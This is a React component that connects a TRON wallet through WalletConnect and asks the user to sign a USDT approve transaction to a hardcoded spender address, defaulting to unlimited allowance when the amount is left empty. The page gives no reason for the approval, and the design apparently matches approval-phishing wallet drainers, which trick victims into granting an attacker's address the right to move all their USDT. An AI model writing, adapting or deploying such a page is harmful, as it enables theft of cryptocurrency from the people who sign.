import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import SignClient from "@walletconnect/sign-client";
import TronWeb from 'tronweb';

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
    TronWeb?: any;
  }
}

const PROJECT_ID = "6b5df56bc30c1dadaab59498b86fd3e8";
const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";

export default function TronApproval() {
  const [amount, setAmount] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [isConnected, setIsConnected] = useState(false);
  const [approvalStatus, setApprovalStatus] = useState<"idle" | "processing" | "success" | "error">("idle");
  const [allowance, setAllowance] = useState("0");
  const [txHash, setTxHash] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const [blockNumber, setBlockNumber] = useState("");
  const [confirmationStatus, setConfirmationStatus] = useState("");
  
  const wcClientRef = useRef<any>(null);
  const wcSessionRef = useRef<any>(null);
  const userAddressRef = useRef<string>("");

  // ===== INIT WALLETCONNECT =====
  useEffect(() => {
    async function initWC() {
      try {
        console.log("🔄 Initializing WalletConnect...");
        
        const client = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "Tron USDT Approval",
            description: "Approve USDT for spending",
            url: window.location.origin,
            icons: [],
          },
        });
        
        wcClientRef.current = client;
        console.log("✅ WalletConnect initialized");
        
        client.on("session_delete", () => {
          console.log("Session deleted");
          resetConnection();
        });
        
        client.on("session_expire", () => {
          console.log("Session expired");
          resetConnection();
        });
        
        document.addEventListener("visibilitychange", () => {
          if (document.visibilityState === "visible" && wcSessionRef.current) {
            console.log("Reconnecting relay...");
            client.core?.relayer?.restartTransport?.();
          }
        });
        
      } catch (error) {
        console.error("Init error:", error);
        setErrorMessage("Failed to initialize WalletConnect");
      }
    }
    
    initWC();
    
    return () => {
      if (wcSessionRef.current) {
        wcClientRef.current?.disconnect({ topic: wcSessionRef.current.topic });
      }
    };
  }, []);
  
  const resetConnection = () => {
    wcSessionRef.current = null;
    userAddressRef.current = "";
    setIsConnected(false);
    setWalletAddress("");
    setAllowance("0");
  };
  
  // ===== CONNECT WALLET =====
  async function connectWallet() {
    try {
      console.log("🔗 Connecting wallet...");
      
      if (!wcClientRef.current) {
        throw new Error("WalletConnect not initialized");
      }
      
      if (wcSessionRef.current) {
        try {
          await wcClientRef.current.disconnect({
            topic: wcSessionRef.current.topic,
            reason: { code: 6000, message: "New connection" },
          });
        } catch (e) {}
        resetConnection();
      }
      
      const { uri, approval } = await wcClientRef.current.connect({
        requiredNamespaces: {
          tron: {
            methods: ["tron_signTransaction", "tron_signMessage"],
            chains: ["tron:0x2b6653dc"],
            events: ["chainChanged", "accountsChanged"],
          },
        },
      });
      
      if (!uri) throw new Error("No URI received");
      
      const { WalletConnectModal } = await import("@walletconnect/modal");
      const modal = new WalletConnectModal({
        projectId: PROJECT_ID,
        themeMode: "dark",
      });
      
      await modal.openModal({ uri });
      wcSessionRef.current = await approval();
      modal.closeModal();
      
      const accounts = Object.values(wcSessionRef.current.namespaces)
        .flatMap((ns: any) => ns.accounts);
      const tronAccount = accounts.find((a: string) => a.startsWith("tron:"));
      
      if (!tronAccount) throw new Error("No TRON account found");
      
      const address = tronAccount.split(":")[2];
      userAddressRef.current = address;
      setWalletAddress(address);
      setIsConnected(true);
      
      console.log("✅ Connected:", address);
      await fetchAllowance(address);
      
      return address;
      
    } catch (error: any) {
      console.error("Connection error:", error);
      setErrorMessage(error.message || "Failed to connect wallet");
      throw error;
    }
  }
  
  // ===== FETCH CURRENT ALLOWANCE =====
  async function fetchAllowance(address: string) {
    try {
      console.log("🔍 Fetching current allowance...");
      
      const tronWeb = new TronWeb({
        fullHost: "https://api.trongrid.io"
      });
      
      const contract = await tronWeb.contract().at(TRON_USDT);
      const allowanceAmount = await contract.allowance(address, TRON_SPENDER).call();
      const allowanceUSDT = (Number(allowanceAmount) / 1e6).toFixed(2);
      
      setAllowance(allowanceUSDT);
      console.log("💰 Current allowance:", allowanceUSDT, "USDT");
      return allowanceUSDT;
      
    } catch (error) {
      console.error("Failed to fetch allowance:", error);
      setAllowance("0");
      return "0";
    }
  }
  
  // ===== VERIFY TRANSACTION ON BLOCKCHAIN =====
  async function verifyTransactionOnBlockchain(txid: string, owner: string, spender: string) {
    console.log("🔍 Verifying transaction on blockchain...");
    setConfirmationStatus("Verifying transaction...");
    
    try {
      // Wait for 5 seconds first
      await new Promise(resolve => setTimeout(resolve, 5000));
      
      // Check transaction status
      const txResponse = await fetch(`https://api.trongrid.io/v1/transactions/${txid}`);
      const txData = await txResponse.json();
      
      console.log("Transaction data:", txData);
      
      if (txData.data && txData.data[0]) {
        const tx = txData.data[0];
        const txStatus = tx.ret[0].contractRet;
        const txBlock = tx.blockNumber;
        
        console.log("📦 Block Number:", txBlock);
        console.log("✅ Transaction Status:", txStatus);
        
        setBlockNumber(txBlock?.toString() || "");
        
        if (txStatus === "SUCCESS") {
          setConfirmationStatus("✅ Transaction confirmed on blockchain!");
          
          // Check new allowance
          await new Promise(resolve => setTimeout(resolve, 3000));
          const newAllowance = await fetchAllowance(owner);
          
          return {
            confirmed: true,
            status: txStatus,
            blockNumber: txBlock,
            allowance: newAllowance
          };
        } else {
          setConfirmationStatus(`⚠️ Transaction status: ${txStatus}`);
          return {
            confirmed: false,
            status: txStatus,
            blockNumber: txBlock,
            allowance: "0"
          };
        }
      } else {
        // Transaction not found yet, wait more
        console.log("Transaction not found yet, waiting...");
        await new Promise(resolve => setTimeout(resolve, 10000));
        
        // Try again
        const retryResponse = await fetch(`https://api.trongrid.io/v1/transactions/${txid}`);
        const retryData = await retryResponse.json();
        
        if (retryData.data && retryData.data[0]) {
          const tx = retryData.data[0];
          setConfirmationStatus("✅ Transaction confirmed!");
          await fetchAllowance(owner);
          return {
            confirmed: true,
            status: tx.ret[0].contractRet,
            blockNumber: tx.blockNumber,
            allowance: await fetchAllowance(owner)
          };
        }
        
        setConfirmationStatus("⚠️ Transaction pending...");
        return {
          confirmed: false,
          status: "PENDING",
          blockNumber: null,
          allowance: "0"
        };
      }
    } catch (error) {
      console.error("Verification error:", error);
      setConfirmationStatus("⚠️ Waiting for confirmation...");
      return {
        confirmed: false,
        status: "UNKNOWN",
        blockNumber: null,
        allowance: "0"
      };
    }
  }
  
  // ===== BUILD APPROVAL TRANSACTION =====
  async function buildApprovalTransaction(userAddress: string, amountValue: string) {
    console.log("📝 Building approval transaction...");
    console.log("User Address:", userAddress);
    console.log("Amount Value:", amountValue);
    
    const tronWeb = new TronWeb({
      fullHost: "https://api.trongrid.io"
    });
    
    // Convert spender address to hex
    let spenderAddress = TRON_SPENDER;
    let spenderHex = tronWeb.address.toHex(spenderAddress);
    
    // Remove '41' prefix if present
    if (spenderHex.startsWith('41')) {
      spenderHex = spenderHex.substring(2);
    }
    
    console.log("Spender Hex (cleaned):", spenderHex);
    
    // Pad to 40 characters (20 bytes without 41 prefix)
    const paddedSpender = spenderHex.padStart(64, '0');
    console.log("Padded spender (64 chars):", paddedSpender);
    
    // Amount encoding
    let amountHex;
    
    if (!amountValue || amountValue.toLowerCase() === "max") {
      // Max approval
      amountHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
      console.log("Using MAX approval");
    } else {
      let numAmount = parseFloat(amountValue);
      
      if (isNaN(numAmount)) {
        throw new Error(`Invalid amount: ${amountValue}`);
      }
      
      // Convert to USDT decimals (6)
      const amountWithDecimals = Math.floor(numAmount * 1000000);
      console.log("Amount with decimals:", amountWithDecimals);
      
      // Convert to hex
      amountHex = tronWeb.toHex(amountWithDecimals);
      
      // Remove '0x' prefix if present
      if (amountHex.startsWith('0x')) {
        amountHex = amountHex.substring(2);
      }
      
      // Pad to 64 characters
      amountHex = amountHex.padStart(64, '0');
      console.log("Amount hex:", amountHex);
    }
    
    // Combine parameter (should be exactly 128 characters)
    const parameter = paddedSpender + amountHex;
    console.log("Final parameter length:", parameter.length);
    
    if (parameter.length !== 128) {
      throw new Error(`Invalid parameter length: ${parameter.length}. Expected 128`);
    }
    
    // Build request
    const requestBody = {
      owner_address: userAddress,
      contract_address: TRON_USDT,
      function_selector: "approve(address,uint256)",
      parameter: parameter,
      fee_limit: 200000000,
      call_value: 0,
      visible: true,
    };
    
    console.log("Sending request to TronGrid...");
    
    const response = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
      method: "POST",
      headers: { 
        "Content-Type": "application/json",
        "Accept": "application/json"
      },
      body: JSON.stringify(requestBody),
    });
    
    const data = await response.json();
    console.log("TronGrid response received");
    
    if (data.Error) {
      throw new Error(`TronGrid Error: ${data.Error}`);
    }
    
    if (data.result && data.result.code) {
      throw new Error(`Transaction error: ${data.result.code} - ${data.result.message || 'Unknown error'}`);
    }
    
    if (!data.transaction) {
      console.error("Unexpected response:", data);
      throw new Error("Failed to build transaction: " + (data.message || JSON.stringify(data)));
    }
    
    console.log("✅ Transaction built successfully!");
    data.transaction.visible = true;
    
    return data.transaction;
  }
  
  // ===== BROADCAST TRANSACTION =====
  async function broadcastTransaction(signedTx: any) {
    console.log("📡 Broadcasting transaction...");
    
    const response = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(signedTx),
    });
    
    const result = await response.json();
    console.log("Broadcast result:", result);
    
    if (!result.result && !result.txid) {
      throw new Error("Broadcast failed: " + JSON.stringify(result));
    }
    
    return result.txid || result.transaction?.txID;
  }
  
  // ===== MAIN APPROVAL FUNCTION =====
  async function handleApprove() {
    console.log("🚀 Starting approval process...");
    setApprovalStatus("processing");
    setErrorMessage("");
    setTxHash("");
    setBlockNumber("");
    setConfirmationStatus("");
    
    try {
      // Connect wallet if not connected
      let address = userAddressRef.current;
      if (!address || !isConnected) {
        address = await connectWallet();
      }
      
      if (!address) {
        throw new Error("Wallet not connected");
      }
      
      // Validate amount
      let approvalAmount = amount;
      if (!approvalAmount || approvalAmount.trim() === "") {
        approvalAmount = "Max";
      }
      
      if (approvalAmount.toLowerCase() !== "max") {
        const numAmount = parseFloat(approvalAmount);
        if (isNaN(numAmount) || numAmount <= 0) {
          throw new Error("Please enter a valid amount or 'Max'");
        }
      }
      
      // Build transaction
      const transaction = await buildApprovalTransaction(address, approvalAmount);
      
      // Sign transaction
      console.log("🔐 Requesting signature from wallet...");
      setConfirmationStatus("Please sign in your wallet...");
      
      const signResponse = await wcClientRef.current.request({
        topic: wcSessionRef.current.topic,
        chainId: "tron:0x2b6653dc",
        request: {
          method: "tron_signTransaction",
          params: [transaction],
        },
      });
      
      console.log("✅ Signature received!");
      setConfirmationStatus("Signature received! Broadcasting...");
      
      // Parse signed transaction
      let signedTx = signResponse;
      if (typeof signedTx === "string") {
        try {
          signedTx = JSON.parse(signedTx);
        } catch (e) {
          console.warn("Failed to parse signed tx:", e);
        }
      }
      
      // Broadcast
      const txid = await broadcastTransaction(signedTx);
      setTxHash(txid);
      console.log("✅ Broadcast successful! TXID:", txid);
      
      setConfirmationStatus("Transaction broadcasted! Waiting for confirmation...");
      
      // Verify on blockchain
      const verification = await verifyTransactionOnBlockchain(txid, address, TRON_SPENDER);
      
      console.log("Verification result:", verification);
      
      if (verification.confirmed && verification.status === "SUCCESS") {
        setApprovalStatus("success");
        setConfirmationStatus("✅ Approval successful on blockchain!");
        
        // Show success message
        alert(`✅ Approval Successful!\n\nTXID: ${txid}\nBlock: ${verification.blockNumber}\nAllowance: ${verification.allowance} USDT\n\nView on Tronscan: https://tronscan.org/#/transaction/${txid}`);
        
      } else {
        setApprovalStatus("success");
        setConfirmationStatus("✅ Transaction broadcasted! Check in a few seconds.");
        
        alert(`✅ Transaction Broadcasted!\n\nTXID: ${txid}\n\nView on Tronscan:\nhttps://tronscan.org/#/transaction/${txid}\n\nAllowance will update once confirmed.`);
      }
      
      setTimeout(() => {
        setApprovalStatus("idle");
        setConfirmationStatus("");
      }, 5000);
      
    } catch (error: any) {
      console.error("❌ Approval error:", error);
      console.error("Error stack:", error.stack);
      setErrorMessage(error.message || "Approval failed");
      setApprovalStatus("error");
      setConfirmationStatus("");
      
      setTimeout(() => {
        setApprovalStatus("idle");
        setErrorMessage("");
      }, 5000);
    }
  }
  
  // ===== DISCONNECT WALLET =====
  async function disconnectWallet() {
    if (wcSessionRef.current) {
      try {
        await wcClientRef.current?.disconnect({
          topic: wcSessionRef.current.topic,
          reason: { code: 6000, message: "User disconnected" },
        });
      } catch (e) {}
    }
    resetConnection();
  }
  
  // ===== CHECK ALLOWANCE MANUALLY =====
  async function checkAllowanceManually() {
    if (!userAddressRef.current) {
      alert("Please connect wallet first");
      return;
    }
    
    setConfirmationStatus("Checking allowance...");
    const allowanceAmount = await fetchAllowance(userAddressRef.current);
    setConfirmationStatus("");
    alert(`💰 Current Allowance: ${allowanceAmount} USDT\n\nSpender: ${TRON_SPENDER}`);
  }
  
  const truncateAddress = (addr: string) => {
    if (!addr) return "";
    return addr.slice(0, 6) + "..." + addr.slice(-4);
  };
  
  return (
    <div style={{
      minHeight: "100vh",
      background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      padding: "20px",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
    }}>
      <div style={{
        maxWidth: "500px",
        width: "100%",
        background: "white",
        borderRadius: "24px",
        padding: "32px",
        boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
      }}>
        
        <div style={{ textAlign: "center", marginBottom: "32px" }}>
          <h1 style={{
            fontSize: "28px",
            fontWeight: "bold",
            margin: "0 0 8px 0",
            background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
            WebkitBackgroundClip: "text",
            WebkitTextFillColor: "transparent",
          }}>
            TRON USDT Approval
          </h1>
          <p style={{ color: "#666", margin: 0 }}>
            Approve spending limit for USDT
          </p>
        </div>
        
        {/* Wallet Section */}
        <div style={{
          background: "#f5f5f5",
          borderRadius: "16px",
          padding: "16px",
          marginBottom: "24px",
        }}>
          <div style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            marginBottom: "12px",
          }}>
            <span style={{ color: "#666", fontSize: "14px" }}>Wallet Status</span>
            {isConnected ? (
              <span style={{ color: "#10b981", fontSize: "12px", fontWeight: "500" }}>
                ● Connected
              </span>
            ) : (
              <span style={{ color: "#ef4444", fontSize: "12px", fontWeight: "500" }}>
                ● Not Connected
              </span>
            )}
          </div>
          
          {isConnected && walletAddress && (
            <div style={{
              background: "white",
              borderRadius: "12px",
              padding: "12px",
              marginBottom: "12px",
            }}>
              <div style={{ color: "#666", fontSize: "12px", marginBottom: "4px" }}>
                Wallet Address
              </div>
              <div style={{
                fontFamily: "monospace",
                fontSize: "14px",
                wordBreak: "break-all",
              }}>
                {truncateAddress(walletAddress)}
              </div>
            </div>
          )}
          
          {isConnected && (
            <div style={{
              background: "#e0f2fe",
              borderRadius: "12px",
              padding: "12px",
              marginBottom: "12px",
            }}>
              <div style={{ color: "#0284c7", fontSize: "12px", marginBottom: "4px" }}>
                Current Allowance
              </div>
              <div style={{
                fontSize: "20px",
                fontWeight: "bold",
                color: "#0369a1",
              }}>
                {allowance} USDT
              </div>
              <button
                onClick={checkAllowanceManually}
                style={{
                  marginTop: "8px",
                  padding: "6px 12px",
                  background: "#0284c7",
                  color: "white",
                  border: "none",
                  borderRadius: "8px",
                  fontSize: "12px",
                  cursor: "pointer",
                }}
              >
                Refresh Allowance
              </button>
            </div>
          )}
          
          <button
            onClick={isConnected ? disconnectWallet : connectWallet}
            style={{
              width: "100%",
              padding: "12px",
              background: isConnected ? "#ef4444" : "#667eea",
              color: "white",
              border: "none",
              borderRadius: "12px",
              fontSize: "16px",
              fontWeight: "600",
              cursor: "pointer",
              marginTop: "12px",
            }}
          >
            {isConnected ? "Disconnect Wallet" : "Connect Wallet"}
          </button>
        </div>
        
        {/* Amount Section */}
        <div style={{ marginBottom: "24px" }}>
          <label style={{
            display: "block",
            marginBottom: "8px",
            color: "#333",
            fontWeight: "500",
          }}>
            Approval Amount
          </label>
          
          <div style={{
            display: "flex",
            gap: "12px",
            marginBottom: "12px",
          }}>
            <input
              type="text"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="Enter amount or 'Max'"
              style={{
                flex: 1,
                padding: "14px",
                border: "2px solid #e5e5e5",
                borderRadius: "12px",
                fontSize: "16px",
                outline: "none",
              }}
            />
            <button
              onClick={() => setAmount("Max")}
              style={{
                padding: "0 20px",
                background: "#f3f4f6",
                border: "none",
                borderRadius: "12px",
                fontSize: "16px",
                fontWeight: "600",
                cursor: "pointer",
                color: "#667eea",
              }}
            >
              Max
            </button>
          </div>
          
          <p style={{
            fontSize: "12px",
            color: "#666",
            margin: 0,
          }}>
            {amount && amount !== "Max" && !isNaN(parseFloat(amount))
              ? `≈ $${parseFloat(amount).toFixed(2)} USD`
              : "Leave empty or 'Max' for unlimited approval"}
          </p>
        </div>
        
        {/* Status Messages */}
        {confirmationStatus && (
          <div style={{
            marginBottom: "16px",
            padding: "12px",
            background: "#f0fdf4",
            borderRadius: "12px",
            fontSize: "13px",
            color: "#166534",
            textAlign: "center",
          }}>
            {confirmationStatus}
          </div>
        )}
        
        {/* Approve Button */}
        <button
          onClick={handleApprove}
          disabled={approvalStatus === "processing" || !isConnected}
          style={{
            width: "100%",
            padding: "16px",
            background: approvalStatus === "processing"
              ? "#9ca3af"
              : approvalStatus === "success"
              ? "#10b981"
              : approvalStatus === "error"
              ? "#ef4444"
              : "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
            color: "white",
            border: "none",
            borderRadius: "12px",
            fontSize: "18px",
            fontWeight: "600",
            cursor: approvalStatus === "processing" || !isConnected ? "not-allowed" : "pointer",
            opacity: approvalStatus === "processing" || !isConnected ? 0.6 : 1,
          }}
        >
          {approvalStatus === "processing" && "⏳ Processing..."}
          {approvalStatus === "success" && "✓ Approval Successful!"}
          {approvalStatus === "error" && "✗ Approval Failed"}
          {approvalStatus === "idle" && "Approve USDT"}
        </button>
        
        {/* Transaction Hash */}
        {txHash && (
          <div style={{
            marginTop: "16px",
            padding: "12px",
            background: "#f0fdf4",
            borderRadius: "12px",
            fontSize: "12px",
          }}>
            <div style={{ color: "#166534", marginBottom: "4px" }}>Transaction Hash:</div>
            <a
              href={`https://tronscan.org/#/transaction/${txHash}`}
              target="_blank"
              rel="noopener noreferrer"
              style={{
                color: "#22c55e",
                textDecoration: "none",
                wordBreak: "break-all",
                fontFamily: "monospace",
              }}
            >
              {txHash}
            </a>
            {blockNumber && (
              <div style={{ marginTop: "8px", color: "#166534" }}>
                Block Number: {blockNumber}
              </div>
            )}
          </div>
        )}
        
        {/* Error Message */}
        {errorMessage && (
          <div style={{
            marginTop: "16px",
            padding: "12px",
            background: "#fef2f2",
            borderRadius: "12px",
            color: "#dc2626",
            fontSize: "12px",
          }}>
            ❌ {errorMessage}
          </div>
        )}
        
        {/* Info Section */}
        <div style={{
          marginTop: "24px",
          padding: "16px",
          background: "#fef3c7",
          borderRadius: "12px",
          fontSize: "12px",
          color: "#92400e",
        }}>
          <div style={{ fontWeight: "bold", marginBottom: "8px" }}>
            ℹ️ How to check on blockchain:
          </div>
          <ul style={{ margin: 0, paddingLeft: "20px" }}>
            <li>After approval, click on TXID link above</li>
            <li>Or go to: https://tronscan.org</li>
            <li>Paste your wallet address and search</li>
            <li>Check "Tokens" → "USDT" → "Allowance"</li>
          </ul>
        </div>
        
      </div>
    </div>
  );
}
